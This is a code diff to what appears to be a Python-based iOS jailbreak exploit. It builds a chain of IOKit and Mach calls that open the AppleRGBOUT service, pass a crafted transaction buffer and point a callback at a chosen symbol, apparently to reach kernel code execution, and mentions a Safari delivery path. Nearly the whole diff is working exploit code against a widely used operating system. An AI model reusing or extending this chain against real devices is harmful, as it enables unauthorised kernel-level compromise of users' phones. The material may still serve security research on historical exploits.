@@ -169,6 +169,7 @@ def do_main_thing():
     if mode == 'dejavu':
         funcall('iokit._IOKitWaitQuiet', 0, 0)
         funcall('iokit._IOServiceGetMatchingService', 0, matching)
+        funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
     else:
         # http://www.opensource.apple.com/source/IOKitUser/IOKitUser-502/FireWireTest.cpp?txt
         #itp = ptrI(0) # XXX this is just for testing
@@ -176,6 +177,7 @@ def do_main_thing():
         funcall('_mach_task_self')
         funcall('_mach_port_allocate', None, 1, portp); dbg_result()
         iteratorp = ptrI(0)
+        servicep = ptrI(0)
 
         port_, portp_ = stackunkpair()
         port_2, portp_2 = stackunkpair()
@@ -185,21 +187,18 @@ def do_main_thing():
 
         funcall('iokit._IOServiceAddNotification', 0, ptr('IOServiceMatched', True), matching, port_, 12345, iteratorp); dbg_result()
         funcall('iokit._IOIteratorNext', iteratorp, load_r0=True)
-        #store_r0_to(itp)
+        store_r0_to(servicep)
+
         zero, nonzero = cmp_r0_0_branch(alt=0 if four_dot_three else 1)
         come_from(zero)
         msg_size = 72
         msg = ptr('\0'*msg_size)
         funcall('_mach_msg', msg, 2, 0, msg_size, port_2, 0, 0); dbg_result()
-        #funcall('iokit._OSGetNotificationFromMessage', msg, 0, portp, portp, 0, 0); dbg_result()
         funcall('iokit._IOIteratorNext', iteratorp, load_r0=True)
-        #store_r0_to(itp)
-        #dbg_result()
+        store_r0_to(servicep)
         come_from(nonzero)
-        #dbg_result()
-        #load_r0_from(itp)
 
-    funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
+        funcall('iokit._IOServiceOpen', servicep, task_self, 0, connect, load_r0=True); dbg_result()
 
     # XXX In Safari, I need to kill this
     funcall('iokit._IOConnectCallScalarMethod', connect, 21, fail_callback, 2, 0, 0, load_r0=True); dbg_result()
@@ -246,7 +245,7 @@ kstuffp = ptr(kstuff + '\0'*32)
 zerop = ptrI(0)
 AppleRGBOUT = ptr('AppleRGBOUT', True)
 connect = ptrI(0)
-fail_callback = ptrI(0xeeeeeeee, 0xeeeeeeee)
+fail_callback = ptrI(dmini.cur.sym('_getpid'), 0xeeeeeeee)
 
 transaction = troll_string('\x00' * (0xd8 if four_dot_three else 0x8c))
 transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
